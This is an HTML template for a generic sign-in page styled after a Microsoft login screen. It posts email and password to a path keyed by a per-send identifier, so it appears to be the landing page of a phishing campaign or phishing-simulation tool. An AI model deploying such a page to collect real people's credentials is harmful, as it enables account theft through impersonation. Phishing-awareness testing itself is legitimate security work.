<!DOCTYPE html>
<html>
<head>
    <title>Sign In</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f3f3f3; margin: 0;
               display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .login-box { background: white; padding: 44px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                     min-width: 360px; }
        h2 { color: #0078d4; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; box-sizing: border-box; }
        button { width: 100%; background: #0078d4; color: white; padding: 12px; border: none;
                 cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign in</h2>
        <p>to continue</p>
        <form action="/c/{{ send_id }}/submit" method="post">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
